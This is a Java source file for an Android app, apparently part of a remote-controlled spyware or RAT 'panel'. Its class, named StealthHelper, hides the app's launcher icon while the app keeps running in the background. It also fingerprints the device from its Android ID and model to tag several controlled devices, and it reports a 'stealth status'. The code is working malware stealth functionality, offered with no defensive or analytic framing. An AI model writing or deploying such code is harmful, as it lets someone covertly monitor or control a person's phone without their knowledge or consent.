package com.java.panel;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.os.Build;

/**
 * Stealth helpers: hide/show launcher icon, basic anti-kill hints,
 * device fingerprint for multi-device tagging.
 */
public class StealthHelper {

    public static String hideIcon(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(
                    comp,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            return "✅ Launcher icon hidden. App still runs in background.";
        } catch (Exception e) {
            return "❌ Hide icon failed: " + e.getMessage();
        }
    }

    public static String showIcon(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(
                    comp,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
            );
            return "✅ Launcher icon restored.";
        } catch (Exception e) {
            return "❌ Show icon failed: " + e.getMessage();
        }
    }

    public static String getDeviceId(Context ctx) {
        try {
            String androidId = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            String model = Build.MODEL != null ? Build.MODEL.replace(" ", "_") : "device";
            String manufacturer = Build.MANUFACTURER != null ? Build.MANUFACTURER : "unk";
            String shortId = androidId != null && androidId.length() >= 6
                    ? androidId.substring(androidId.length() - 6)
                    : "000000";
            return (manufacturer + "_" + model + "_" + shortId).toLowerCase();
        } catch (Exception e) {
            return "device_unknown";
        }
    }

    public static String getDeviceTag(Context ctx) {
        return "[" + getDeviceId(ctx) + "]";
    }

    public static String status(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName comp = new ComponentName(ctx, MainActivity.class);
            int state = pm.getComponentEnabledSetting(comp);
            boolean hidden = state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            return "🕵️ Stealth status\n"
                    + "• Device: " + getDeviceId(ctx) + "\n"
                    + "• Icon hidden: " + (hidden ? "YES" : "NO") + "\n"
                    + "• Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
                    + "• Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }
}
